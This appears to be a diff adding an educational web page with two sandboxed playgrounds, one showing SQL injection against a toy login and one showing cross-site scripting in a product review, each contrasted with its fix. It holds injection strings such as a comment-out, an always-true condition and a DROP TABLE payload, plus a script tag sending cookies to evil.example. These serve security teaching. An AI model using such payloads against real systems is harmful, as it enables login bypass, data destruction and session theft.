@@ -1,0 +1,110 @@
+---
+import PlaygroundShell from '../components/PlaygroundShell.astro';
+---
+<PlaygroundShell title="SQL injection on a login" hint="A toy database with three users. The login query is built either by joining strings or with parameters. Nothing here touches a real database.">
+  <ol class="how">
+    <li>With <b>String concatenation</b>, log in as <b>alice</b> with the wrong password: no rows, so it fails, as it should.</li>
+    <li>Pick <b>Attack: comment out the password check</b> or <b>Attack: always-true condition</b>: the query changes shape, and you log in without the password, or get every user.</li>
+    <li>Switch to <b>Parameterized</b> and repeat the same attacks: the input is only ever data, so nothing matches.</li>
+  </ol>
+  <div class="pg inj" data-inj>
+    <div class="pg-row">
+      <label>Query is built with <select class="pg-in" data-mode><option value="concat" selected>String concatenation</option><option value="param">Parameterized query</option></select></label>
+      <label>Try <select class="pg-in" data-preset>
+        <option value="normal">alice with the right password</option>
+        <option value="wrong" selected>alice with a wrong password</option>
+        <option value="comment">Attack: comment out the password check</option>
+        <option value="always">Attack: always-true condition</option>
+        <option value="drop">Attack: add a second command</option>
+      </select></label>
+    </div>
+    <div class="pg-row">
+      <label>Name <input class="pg-in" data-name value="alice" /></label>
+      <label>Password <input class="pg-in" data-pass value="nope" /></label>
+    </div>
+    <p class="pg-note">Query the server runs:</p>
+    <pre class="pg-code" data-query></pre>
+    <div class="pg-grid">
+      <div class="pg-box" data-resbox><h3>Rows returned</h3><span class="pg-mono" data-rows></span></div>
+    </div>
+    <p class="pg-out" data-verdict aria-live="polite"></p>
+  </div>
+</PlaygroundShell>
+<PlaygroundShell title="Cross-site scripting in a review" hint="A review is shown on a product page. The page either inserts it as HTML or encodes it. This demo only displays the page's source text and never runs it.">
+  <div class="pg xss" data-xss>
+    <div class="pg-row">
+      <label>Review text <input class="pg-in xss-in" data-review value="<script>sendCookiesTo('evil.example')</script>" /></label>
+      <label>Page writes it <select class="pg-in" data-render><option value="raw" selected>As raw HTML</option><option value="encoded">Encoded</option></select></label>
+    </div>
+    <p class="pg-note">HTML the server sends:</p>
+    <pre class="pg-code" data-html></pre>
+    <p class="pg-out" data-xverdict aria-live="polite"></p>
+  </div>
+</PlaygroundShell>
+<script>
+  const users = [{ name: 'alice', pass: 'wonderland' }, { name: 'bob', pass: 'builder' }, { name: 'carol', pass: 'singer' }];
+  const presets: Record<string, [string, string]> = { normal: ['alice', 'wonderland'], wrong: ['alice', 'nope'], comment: ["alice' --", 'anything'], always: ['alice', "' OR '1'='1"], drop: ["alice'; DROP TABLE users; --", 'x'] };
+
+  // A toy interpreter for: SELECT name FROM users WHERE <conditions>; ...
+  function runToy(query: string): { rows: string[]; error?: string; dropped?: boolean } {
+    const statements = query.split(';').map((s) => s.trim()).filter(Boolean);
+    const dropped = statements.slice(1).some((s) => /^drop\s+table\s+users\b/i.test(s));
+    const first = statements[0].replace(/--.*$/, '').trim();
+    const m = /^SELECT name FROM users WHERE (.*)$/i.exec(first);
+    if (!m) return { rows: [], error: 'syntax error', dropped };
+    const term = /^\s*(?:(name|password)|'([^']*)'|(\d+))\s*=\s*(?:'([^']*)'|(\d+))\s*$/;
+    try {
+      const orGroups = m[1].split(/\s+OR\s+/i).map((g) => g.split(/\s+AND\s+/i));
+      const rows = users.filter((u) => orGroups.some((ands) => ands.every((t) => {
+        const r = term.exec(t); if (!r) throw new Error('syntax error');
+        const left = r[1] ? (r[1] === 'name' ? u.name : u.pass) : (r[2] ?? r[3]); const right = r[4] ?? r[5];
+        return left === right;
+      }))).map((u) => u.name);
+      return { rows, dropped };
+    } catch { return { rows: [], error: 'syntax error', dropped }; }
+  }
+
+  document.querySelectorAll<HTMLElement>('[data-inj]').forEach((root) => {
+    const q = <T extends HTMLElement>(s: string) => root.querySelector<T>(s)!;
+    function draw() {
+      const name = q<HTMLInputElement>('[data-name]').value; const pass = q<HTMLInputElement>('[data-pass]').value; const mode = q<HTMLSelectElement>('[data-mode]').value;
+      let rows: string[]; let error: string | undefined; let dropped = false;
+      if (mode === 'concat') {
+        const query = `SELECT name FROM users WHERE name = '${name}' AND password = '${pass}'`;
+        q('[data-query]').textContent = query;
+        ({ rows, error, dropped } = runToy(query));
+      } else {
+        q('[data-query]').textContent = `SELECT name FROM users WHERE name = ? AND password = ?\nvalues: ${JSON.stringify(name)}, ${JSON.stringify(pass)}`;
+        rows = users.filter((u) => u.name === name && u.pass === pass).map((u) => u.name);
+      }
+      q('[data-rows]').textContent = error ? `SQL ${error}` : rows.length ? rows.join(', ') : 'none';
+      const legit = rows.length === 1 && rows[0] === name && users.find((u) => u.name === name)?.pass === pass;
+      const breach = !error && rows.length > 0 && !legit;
+      q<HTMLElement>('[data-resbox]').style.setProperty('--c', breach || dropped ? 'var(--bad)' : 'var(--role-2)');
+      const out = q('[data-verdict]'); out.classList.toggle('bad', breach || dropped);
+      out.textContent = dropped ? 'A second command ran: the users table would be dropped.' : breach ? `Logged in without the right password (${rows.length} row${rows.length > 1 ? 's' : ''} returned).` : legit ? 'Normal login succeeded.' : error ? 'The database rejected a malformed query. Attackers probe for exactly these errors.' : 'Login refused.';
+    }
+    q('[data-preset]').addEventListener('change', () => { const [n, p] = presets[q<HTMLSelectElement>('[data-preset]').value]; q<HTMLInputElement>('[data-name]').value = n; q<HTMLInputElement>('[data-pass]').value = p; draw(); });
+    root.addEventListener('input', draw); root.addEventListener('change', draw);
+    draw();
+  });
+
+  const esc = (t: string) => t.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+  document.querySelectorAll<HTMLElement>('[data-xss]').forEach((root) => {
+    const q = <T extends HTMLElement>(s: string) => root.querySelector<T>(s)!;
+    function draw() {
+      const review = q<HTMLInputElement>('[data-review]').value; const encoded = q<HTMLSelectElement>('[data-render]').value === 'encoded';
+      const html = `<p class="review">${encoded ? esc(review) : review}</p>`;
+      q('[data-html]').textContent = html;
+      const runs = !encoded && /<\s*script|\son\w+\s*=|javascript:|<\s*iframe/i.test(review);
+      const out = q('[data-xverdict]'); out.classList.toggle('bad', runs);
+      out.textContent = runs ? 'A browser would run this code in every visitor\'s session.' : encoded ? 'Shown as visible text. The browser treats it as data, not markup.' : 'No active content here, but raw output is still unsafe for the next input.';
+    }
+    root.addEventListener('input', draw); root.addEventListener('change', draw);
+    draw();
+  });
+</script>
+<style is:global>
+  .playground .inj .pg-in, .playground .xss .pg-in { min-width: 12rem; }
+  .playground .xss-in { min-width: min(100%, 26rem); }
+</style>
